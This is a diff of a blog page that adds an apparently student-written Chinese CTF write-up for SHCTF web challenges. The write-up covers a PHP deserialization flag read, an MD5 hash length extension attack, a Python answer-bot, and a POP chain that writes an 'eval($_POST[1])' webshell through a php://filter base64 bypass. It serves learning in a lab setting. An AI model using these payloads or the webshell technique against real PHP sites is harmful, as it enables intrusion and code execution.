+unserialize($_GET[&#39;try&#39;]);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+编写其反序列化代码
+
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
+highlight_file(*__FILE__*);
+class flag&#123;
+    public $username;
+    public $code &#x3D; &#39;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&#39;;
+    public function __wakeup()&#123;
+        $this-&gt;username &#x3D; &quot;guest&quot;;
+    &#125;
+    public function __destruct()&#123;
+        if($this-&gt;username &#x3D; &quot;admin&quot;)&#123;
+            include($this-&gt;code);
+        &#125;
+    &#125;
+&#125;
+$a &#x3D; new flag();
+echo serialize($a);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+运行结果为
+
+> O:4:"flag":2:{s:8:"username";N;s:4:"code";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";}
+
+![](https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311021635121.png)
+
+
+### MD5的事就拜托了
+
+题目源码
+
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
+highlight_file(__FILE__);
+include(&quot;flag.php&quot;);
+if(isset($_POST[&#39;SHCTF&#39;]))&#123;
+  extract(parse_url($_POST[&#39;SHCTF&#39;]));
+  if($$$scheme&#x3D;&#x3D;&#x3D;&#39;SHCTF&#39;)&#123;
+    echo(md5($flag));
+    echo(&quot;&lt;&#x2F;br&gt;&quot;);
+  &#125;
+  if(isset($_GET[&#39;length&#39;]))&#123;
+    $num&#x3D;$_GET[&#39;length&#39;];
+    if($num*100!&#x3D;intval($num*100))&#123;
+      echo(strlen($flag));
+      echo(&quot;&lt;&#x2F;br&gt;&quot;);
+    &#125;
+  &#125;
+&#125;
+if($_POST[&#39;SHCTF&#39;]!&#x3D;md5($flag))&#123;
+  if($_POST[&#39;SHCTF&#39;]&#x3D;&#x3D;&#x3D;md5($flag.urldecode($num)))&#123;
+    echo(&quot;flag is&quot;.$flag);
+  &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+通过后续从大佬WP上学习知道该题为MD5补充攻击，需要我们取得知flag的长度和MD5值
+
+#### 第一步、获得flag的MD5值
+
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">参考源码
+if(isset($_POST[&#39;SHCTF&#39;]))&#123;
+  extract(parse_url($_POST[&#39;SHCTF&#39;]));
+  if($$$scheme&#x3D;&#x3D;&#x3D;&#39;SHCTF&#39;)&#123;
+    echo(md5($flag));
+    echo(&quot;&lt;&#x2F;br&gt;&quot;);
+  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+这里面有几个不认识的函数，例如：**parse_url()**，其效果为
+
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
+$url &#x3D; &#39;http:&#x2F;&#x2F;username:password@hostname&#x2F;path?arg&#x3D;value#anchor&#39;;
+print_r(parse_url($url));
+echo parse_url($url, PHP_URL_PATH);
+?&gt;
+结果----------
+Array
+(
+    [scheme] &#x3D;&gt; http
+    [host] &#x3D;&gt; hostname
+    [user] &#x3D;&gt; username
+    [pass] &#x3D;&gt; password
+    [path] &#x3D;&gt; &#x2F;path
+    [query] &#x3D;&gt; arg&#x3D;value
+    [fragment] &#x3D;&gt; anchor
+)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+**extract()函数**
+
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
+$a &#x3D; &quot;Original&quot;;
+$my_array &#x3D; array(&quot;a&quot; &#x3D;&gt; &quot;Cat&quot;,&quot;b&quot; &#x3D;&gt; &quot;Dog&quot;, &quot;c&quot; &#x3D;&gt; &quot;Horse&quot;);
+extract($my_array);
+echo &quot;\$a &#x3D; $a; \$b &#x3D; $b; \$c &#x3D; $c&quot;;
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+> **extract() 函数从数组中将变量导入到当前的符号表。**
+>
+> **该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。**
+>
+> **第二个参数 *type* 用于指定当某个变量已经存在，而数组中又有同名元素时，extract() 函数如何对待这样的冲突。该函数返回成功导入到符号表中的变量数目**。
+
+**如果要满足`$$$scheme==='SHCTF'`，我们可以使`[scheme] => host`，导致`$$host==='SHCTF'`；再使得`[host] => user`导致`$user==='SHCTF'`，就满足条件。**
+
+可以构造如下的数组
+
+<pre class="line-numbers language-none"><code class="language-none">Array
+(
+    [scheme] &#x3D;&gt; host
+    [host] &#x3D;&gt; user
+    [user] &#x3D;&gt; SHCTF
+    [pass] &#x3D;&gt; password
+    [path] &#x3D;&gt; &#x2F;path
+    [query] &#x3D;&gt; arg&#x3D;value
+    [fragment] &#x3D;&gt; anchor
+)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+**构造payload：host://SHCTF:password@user/path?arg=value#anchor**
+
+得到的flag的MD5值为： **5eff41d1008c731b14eec5d18c32d942**
+
+![](https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311021655560.png)
+
+#### **第二步、获取flag的长度**
+
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">参考源码
+if(isset($_GET[&#39;length&#39;]))&#123;
+    $num&#x3D;$_GET[&#39;length&#39;];
+    if($num*100!&#x3D;intval($num*100))&#123;
+      echo(strlen($flag));
+      echo(&quot;&lt;&#x2F;br&gt;&quot;);
+    &#125;
+  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+可以参考这位大佬的博客[PHP intval()函数详解，intval()函数漏洞原理及绕过思路_intval绕过-CSDN博客](https://blog.csdn.net/wangyuxiang946/article/details/131156104)
+
+在**intval函数**中其会对所得的值进行取整，所以我们可以使**$num=1.111**即可得到flag的长度
+
+得到flag的长度为 42
+
+![](https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311021659865.png)
+
+#### 第三步、计算“md5($flag.urldecode($num))”
+
+通过github上的[哈希长度扩展攻击利用脚本](https://github.com/shellfeel/hash-ext-attack)可以通过已知的信息来求解
+
+![](https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311021710096.png)
+
+> 所以目前已知信息满足该**md5("密文"+"处理过的已知字符串")=处理过的哈希值**公式
+>
+> **md5($flag+"\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00P\x01\x00\x00\x00\x00\x00\x00233")=7b0d8d07ac2974cc262613ed18d200df**
+
+将其中**处理过的已知字符串**将其\x替换为%进行url编码一下传参给length
+
+再将**处理过的hash值**传参给SHCTF，执行即可得到flag
+
+![](https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311021717025.png)
+
+## WEEK3
+
+### 快问快答
+
+![](https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311021756005.png)
+
+根据这题提示以及尝试，要求我们2s内回答问题并连续答对50道，可想而知我们需要另辟蹊径了，即我们可以编写一个python代码来完成50道答题
+
+代码如下
+
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">import requests
+from bs4 import BeautifulSoup
+import re
+import time
+
+# 创建会话
+s &#x3D; requests.Session()
+url &#x3D; &#39;http:&#x2F;&#x2F;112.6.51.212:31530&#x2F;&#39; #url
+
+# 循环答题
+correct_answers &#x3D; 0
+for i in range(70):  # 除法运算时有些报错，影响了循环，这里改70
+    # 获取题目
+    r &#x3D; s.get(url)
+    r.encoding &#x3D; &#39;utf-8&#39;
+    soup &#x3D; BeautifulSoup(r.text, &quot;html.parser&quot;)
+    question_text &#x3D; soup.find(&quot;h3&quot;).text
+    print(question_text)
+
+    # 使用正则表达式从题目中提取数字和运算符
+    matches &#x3D; re.match(r&#39;题目：(\d+) (异或|与|[+\-x÷]) (\d+) &#x3D;&#39;, question_text)
+    # 等待一秒
+    time.sleep(1)
+    if matches:
+        num1 &#x3D; int(matches.group(1))
+        operator &#x3D; matches.group(2)
+        num2 &#x3D; int(matches.group(3))
+
+        if operator &#x3D;&#x3D; &#39;+&#39;:
+            answer &#x3D; num1 + num2
+        elif operator &#x3D;&#x3D; &#39;-&#39;:
+            answer &#x3D; num1 - num2
+        elif operator &#x3D;&#x3D; &#39;x&#39;:
+            answer &#x3D; num1 * num2
+        elif operator &#x3D;&#x3D; &#39;÷&#39;:
+            answer &#x3D; num1 &#x2F; num2
+        elif operator &#x3D;&#x3D; &#39;异或&#39;:
+            answer &#x3D; num1 ^ num2
+        elif operator &#x3D;&#x3D; &#39;与&#39;:
+            answer &#x3D; num1 &amp; num2
+
+        # 准备POST数据
+        data &#x3D; &#123;&quot;answer&quot;: answer&#125;
+
+        # 发送答案
+        response &#x3D; s.post(url, data&#x3D;data)
+        print(f&quot;答案：&#123;answer&#125;&quot;)
+        print(response.text)  # 输出对应的response.text
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+![](https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311021806467.png)
+
+### sseerriiaalliizzee
+
+本题从题目看就是一道POC链 题目
+
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
+error_reporting(0);
+highlight_file(__FILE__);
+class Start&#123;
+    public $barking;
+    public function __construct()&#123;
+        $this-&gt;barking &#x3D; new Flag;
+    &#125;
+    public function __toString()&#123;
+            return $this-&gt;barking-&gt;dosomething();
+    &#125;
+&#125;
+class CTF&#123; 
+    public $part1;
+    public $part2;
+    public function __construct($part1&#x3D;&#39;&#39;,$part2&#x3D;&#39;&#39;) &#123;
+        $this -&gt; part1 &#x3D; $part1;
+        $this -&gt; part2 &#x3D; $part2;        
+    &#125;
+    public function dosomething()&#123;
+        $useless   &#x3D; &#39;&lt;?php die(&quot;+Genshin Impact Start!+&quot;);?&gt;&#39;;
+        $useful&#x3D; $useless. $this-&gt;part2;
+        file_put_contents($this-&gt; part1,$useful);
+    &#125;
+&#125;
+class Flag&#123;
+    public function dosomething()&#123;
+        include(&#39;.&#x2F;flag,php&#39;);
+        return &quot;barking for fun!&quot;;
+    &#125;
+&#125;
+    $code&#x3D;$_POST[&#39;code&#39;]; 
+    if(isset($code))&#123;
+       echo unserialize($code);
+    &#125;
+    else&#123;
+        echo &quot;no way, fuck off&quot;;
+    &#125;
+?&gt; 
+no way, fuck off<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+**本题可以构造的POC链为**
+
+**Start \__construct() -> Start __toString() -> CTF dosomething()**
+
+这其中我们需要考虑的是如何绕过CTF类中的$useless里面的die方法，如果使其执行，那么代码直接结束，我们想要写入的代码也无法写入，通过上网搜索，可以通过base编码来绕过
+
+> 原理其实很简单，利用base64解码，将死亡代码解码成乱码，使得php引擎无法识别；
+>
+> <pre class="line-numbers language-none"><code class="language-none">$filename&#x3D;&#39;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;s1mple.php&#39;;
+$content &#x3D; &#39;aPD9waHAgcGhwaW5mbygpOz8+&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+>
+> 这里之所以将$content加了一个a，是因为base64在解码的时候是将4个字节转化为3个字节，又因为死亡代码只有phpexit参与了解码，所以补上一位就可以完全转化；载荷效果如下：
+
+具体详情可以看这位大佬博客[file_put_content和死亡·杂糅代码之缘 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/8163)
+
+所以我们可以如此构造POC链
+
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">$a &#x3D; new Start();
+$b &#x3D; new CTF();
+$a -&gt; barking &#x3D; $b;
+$b -&gt; part1 &#x3D; &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;1.php&quot;;
+$b -&gt; part2 &#x3D;  &#39;aa&#39;.base64_encode(&#39;&lt;?php eval($_POST[1]); ?&gt;&#39;);
+echo serialize($a);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+将序列化后的值传参进去
+
+![](https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311021932320.png)
+
+然后访问我们设置的php位置并输入相关查询指令
+
+![](https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311021936942.png)
+
+
                 
             </div>
             <hr/>
@@ -530,7 +979,7 @@ if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://know5.github.io/2023/10/08/2023NewStarCTF-Week1-%E9%83%A8%E5%88%86WP/">https://know5.github.io/2023/10/08/2023NewStarCTF-Week1-%E9%83%A8%E5%88%86WP/</a>
+                    <a href="https://know5.github.io/2023/11/01/SHCTF-Web-WP/">https://know5.github.io/2023/11/01/SHCTF-Web-WP/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -568,8 +1017,8 @@ if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E5%9F%BA%E7%A1%80%EF%BC%8C%E6%96%B0%E6%89%8B%EF%BC%8CWEB%E5%AD%A6%E4%B9%A0%EF%BC%8CCTF/">
-                                    <span class="chip bg-color">基础，新手，WEB学习，CTF</span>
+                                <a href="/tags/WEB%E3%80%81%E5%AD%A6%E4%B9%A0%E3%80%81%E6%96%B0%E6%89%8B/">
+                                    <span class="chip bg-color">WEB、学习、新手</span>
                                 </a>
                             
                         </div>
@@ -648,9 +1097,56 @@ if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2023/11/01/SHCTF-Web-WP/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="SHCTF-Web-WP">
+                        
+                        <span class="card-title">SHCTF-Web-WP</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-11-01
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Know5
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/WEB%E3%80%81%E5%AD%A6%E4%B9%A0%E3%80%81%E6%96%B0%E6%89%8B/">
+                        <span class="chip bg-color">WEB、学习、新手</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
             <div class="card">
                 <a href="/2023/10/25/2023NewStarCTF-Week2-%E9%83%A8%E5%88%86WP/">
                     <div class="card-image">
@@ -668,9 +1164,9 @@ if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-10-25
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-10-25
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -684,51 +1180,6 @@ if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
                     
                     <a href="/tags/WEB-%E5%AD%A6%E4%B9%A0/">
                         <span class="chip bg-color">WEB 学习</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2023/08/11/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%A4%8D%E7%8E%B0-%E9%99%84%E5%B8%A6win7%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="永恒之蓝复现(附带win7虚拟机安装教程)">
-                        
-                        <span class="card-title">永恒之蓝复现(附带win7虚拟机安装教程)</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-08-11
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            Know5
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/%E6%BC%8F%E6%B4%9E%EF%BC%8C%E8%99%9A%E6%8B%9F%E6%9C%BA/">
-                        <span class="chip bg-color">漏洞，虚拟机</span>
                     </a>
                     
                 </div>
